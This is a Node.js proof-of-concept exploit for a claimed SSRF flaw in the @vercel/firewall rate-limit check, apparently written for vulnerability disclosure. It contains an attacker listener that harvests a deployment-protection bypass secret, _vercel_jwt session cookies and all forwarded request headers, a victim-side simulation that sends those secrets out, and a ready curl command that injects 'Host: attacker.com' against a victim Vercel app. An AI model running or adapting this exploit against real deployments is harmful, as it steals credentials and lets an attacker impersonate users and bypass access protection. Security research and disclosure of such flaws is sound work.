/**
 * PoC: SSRF + Secret Leakage via Host Header Injection in @vercel/firewall
 *
 * This demonstrates how an attacker can exploit the checkRateLimit() function
 * to exfiltrate VERCEL_AUTOMATION_BYPASS_SECRET, _vercel_jwt cookies, and
 * all request headers to an attacker-controlled server.
 *
 * Usage:
 *   1. Run the attacker's listener: node poc-ssrf-firewall.js --listen
 *   2. In another terminal, simulate the victim: node poc-ssrf-firewall.js --victim
 *   3. Observe the leaked secrets in the listener's output
 *
 * In a real attack, the attacker would send:
 *   curl -H "Host: attacker.com" https://victim.vercel.app/api/rate-limited-endpoint
 */

const http = require('http');
const https = require('https');

const MODE = process.argv[2];

if (MODE === '--listen') {
  // === ATTACKER SIDE: Listener that captures leaked secrets ===
  const server = http.createServer((req, res) => {
    console.log('\n' + '='.repeat(60));
    console.log('CAPTURED SSRF REQUEST - LEAKED SECRETS:');
    console.log('='.repeat(60));
    console.log(`Path: ${req.url}`);
    console.log('');

    const secrets = {};
    for (const [name, value] of Object.entries(req.headers)) {
      if (name === 'x-vercel-protection-bypass' && value) {
        secrets['VERCEL_AUTOMATION_BYPASS_SECRET'] = value;
        console.log(`[CRITICAL] ${name}: ${value}`);
      } else if (name === 'cookie' && value.includes('_vercel_jwt')) {
        secrets['_vercel_jwt'] = value;
        console.log(`[CRITICAL] ${name}: ${value}`);
      } else if (name === 'x-vercel-rate-limit-key') {
        secrets['rate_limit_key_hash'] = value;
        console.log(`[HIGH] ${name}: ${value}`);
      } else if (name.startsWith('x-rr-')) {
        const originalHeader = name.slice(5);
        console.log(`[LEAKED HEADER] ${originalHeader}: ${value}`);
      } else {
        console.log(`${name}: ${value}`);
      }
    }

    console.log('\n--- SUMMARY ---');
    if (secrets['VERCEL_AUTOMATION_BYPASS_SECRET']) {
      console.log(`Automation Bypass Secret: ${secrets['VERCEL_AUTOMATION_BYPASS_SECRET']}`);
      console.log('  -> Can bypass deployment protection on all preview deployments');
    }
    if (secrets['_vercel_jwt']) {
      console.log(`JWT Cookie: ${secrets['_vercel_jwt']}`);
      console.log('  -> Can impersonate the user on Vercel services');
    }

    // Respond with 204 (Not Rate Limited) to avoid disrupting the victim app
    res.writeHead(204);
    res.end();
  });

  server.listen(8443, () => {
    console.log('Attacker listener running on http://localhost:8443');
    console.log('Waiting for SSRF callbacks...\n');
  });

} else if (MODE === '--victim') {
  // === VICTIM SIDE: Simulates the vulnerable code path ===
  // This replicates what checkRateLimit() does internally

  // Simulate environment variables that would be set in a real Vercel deployment
  process.env.NODE_ENV = 'production';
  process.env.VERCEL_AUTOMATION_BYPASS_SECRET = 'super-secret-bypass-token-12345';
  process.env.RATE_LIMIT_SECRET = 'rate-limit-secret-67890';

  // Simulate an incoming request with an attacker-controlled Host header
  const attackerHost = 'localhost:8443';
  const requestHeaders = new Headers({
    'host': attackerHost,  // <-- ATTACKER CONTROLLED
    'authorization': 'Bearer user-api-key-abc123',
    'cookie': '_vercel_jwt=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.fake-jwt-token; session=user-session-id',
    'x-real-ip': '198.51.100.42',
    'x-forwarded-for': '198.51.100.42, 10.0.0.1',
    'x-custom-api-key': 'sk-project-sensitive-key',
  });

  // This is what checkRateLimit() does (simplified from rate-limit.ts):
  const firewallHost = requestHeaders.get('host');  // Line 75
  const rateLimitId = 'my-rate-limit';

  // Line 100: URL constructed with attacker-controlled host
  const url = `http://${firewallHost}/.well-known/vercel/rate-limit-api/${encodeURIComponent(rateLimitId)}`;

  console.log(`[VICTIM] checkRateLimit() constructing URL: ${url}`);
  console.log(`[VICTIM] This should go to the app's own domain, but goes to attacker instead!`);

  // Lines 109-126: Build headers with secrets
  const rateLimitHeaders = new Headers({
    'x-vercel-rate-limit-api': rateLimitId,
    'x-vercel-rate-limit-key': 'ip-hash-containing-secrets',
    'user-agent': 'Bot/Vercel Rate Limit Checker',
    'x-forwarded-for': requestHeaders.get('x-forwarded-for') || '',
    'x-real-ip': requestHeaders.get('x-real-ip') || '',
    'x-vercel-protection-bypass': process.env.VERCEL_AUTOMATION_BYPASS_SECRET || '',
  });

  // Forward _vercel_jwt cookie
  const cookieHeader = requestHeaders.get('cookie') || '';
  const jwtMatch = cookieHeader.match(/_vercel_jwt=([^;]+)/);
  if (jwtMatch) {
    rateLimitHeaders.append('cookie', `_vercel_jwt=${jwtMatch[1]}`);
  }

  // Forward ALL request headers with x-rr- prefix
  for (const [key, value] of requestHeaders.entries()) {
    rateLimitHeaders.append(`x-rr-${key}`, value);
  }

  console.log(`[VICTIM] Sending request with secrets to: ${url}`);

  // Line 128-132: Fetch to attacker-controlled URL
  fetch(url, {
    method: 'GET',
    headers: rateLimitHeaders,
    redirect: 'manual',
  }).then(response => {
    console.log(`[VICTIM] Got response: ${response.status}`);
    if (response.status === 204) {
      console.log(`[VICTIM] Rate limit check says: not rate limited`);
      console.log(`[VICTIM] But all secrets were just leaked to the attacker!`);
    }
  }).catch(err => {
    console.error(`[VICTIM] Error: ${err.message}`);
    console.log('\nMake sure the attacker listener is running: node poc-ssrf-firewall.js --listen');
  });

} else {
  console.log(`
SSRF + Secret Leakage PoC for @vercel/firewall checkRateLimit()

Usage:
  Terminal 1 (attacker):  node poc-ssrf-firewall.js --listen
  Terminal 2 (victim):    node poc-ssrf-firewall.js --victim

Real-world attack:
  curl -H "Host: attacker.com" https://victim-app.vercel.app/api/endpoint

The victim's checkRateLimit() will send VERCEL_AUTOMATION_BYPASS_SECRET,
_vercel_jwt cookie, and all request headers to the attacker's server.
`);
}
